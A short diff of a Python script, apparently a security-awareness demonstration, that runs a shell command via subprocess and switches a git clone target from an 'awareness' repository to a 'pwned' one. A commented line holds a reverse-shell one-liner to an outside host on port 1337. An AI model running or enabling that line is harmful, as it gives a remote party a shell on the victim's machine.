@@ -1,5 +1,5 @@
 import subprocess
 
-comando = "git clone https://github.com/theredguild/awareness"
+comando = "git clone https://github.com/theredguild/pwned"
 # comando = "sh -i >& /dev/tcp/rev.theredguild.org/1337 0>&1"
 resultado = subprocess.run(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
